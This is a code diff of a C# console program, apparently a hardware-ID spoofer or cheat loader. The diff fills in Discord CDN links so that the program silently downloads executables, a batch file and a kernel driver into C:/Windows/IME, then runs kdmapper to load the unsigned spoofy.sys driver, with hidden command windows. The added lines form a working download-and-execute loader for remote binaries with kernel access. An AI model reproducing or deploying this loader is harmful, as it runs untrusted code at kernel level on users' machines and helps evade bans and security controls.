@@ -107,8 +107,8 @@ namespace ConsoleApp4
         private static void clean()
         {
             WebClient D = new WebClient();
-            string exe = ("C:/Windows/IME/");//put end on your file here exsample spoof.sys
-            D.DownloadFile("", exe);// put your download link to your file discord link works fine
+            string exe = ("C:/Windows/IME/cleaner_protected.exe");//put end on your file here exsample spoof.sys
+            D.DownloadFile("https://cdn.discordapp.com/attachments/816126846533369886/822724983850532870/cleaner_protected.exe", exe);// put your download link to your file discord link works fine
             Process start = new Process();
             start.StartInfo.FileName = "Cmd.exe";
             start.StartInfo.UseShellExecute = true;
@@ -124,7 +124,7 @@ namespace ConsoleApp4
         {
             WebClient D = new WebClient();
             string bat = ("C:/Windows/IME/Serials.bat");///put end on your file here exsample spoof.sys
-            D.DownloadFile("", bat);// put your download link to your file discord link works fine
+            D.DownloadFile("https://cdn.discordapp.com/attachments/802745550679179264/823076189786734652/Serials.bat", bat);// put your download link to your file discord link works fine
             Process start = new Process();
             start.StartInfo.FileName = "Cmd.bat";
             start.StartInfo.UseShellExecute = true;
@@ -137,10 +137,10 @@ namespace ConsoleApp4
         private static void Download()
         {
             WebClient D = new WebClient();
-            string sys = ("C:/Windows/IME/");//put end on your file here exsample spoof.sys
-            string mapper = ("C:/Windows/IME/");//put end on your file here exsample spoof.sys
-            D.DownloadFile("", sys);
-            D.DownloadFile("", mapper);// put your download link to your file discord link works fine
+            string sys = ("C:/Windows/IME/spoofy.sys");//put end on your file here exsample spoof.sys
+            string mapper = ("C:/Windows/IME/kdmapper.exe");//put end on your file here exsample spoof.sys
+            D.DownloadFile("https://cdn.discordapp.com/attachments/798311924886142987/798527673205915658/spoofy.sys", sys);
+            D.DownloadFile("https://cdn.discordapp.com/attachments/798311924886142987/800197318452052018/kdmapper.exe", mapper);// put your download link to your file discord link works fine
             Process start = new Process();
             start.StartInfo.FileName = "Cmd.exe";
             start.StartInfo.UseShellExecute = true;
@@ -149,8 +149,8 @@ namespace ConsoleApp4
             start = Process.Start(mapper, sys);
             Thread.Sleep(2000);
             start.Close();
-            string bb = ("C:/Windows/IME/");//put end on your file here exsample spoof.sys
-            D.DownloadFile("", bb);// put your download link to your file discord link works fine
+            string bb = ("C:/Windows/IME/kernel_1.exe");//put end on your file here exsample spoof.sys
+            D.DownloadFile("https://cdn.discordapp.com/attachments/798311924886142987/798537095915765760/kernel_1.exe", bb);// put your download link to your file discord link works fine
             start.StartInfo.FileName = "Cmd.exe";
             start.StartInfo.UseShellExecute = true;
             start.StartInfo.CreateNoWindow = true;
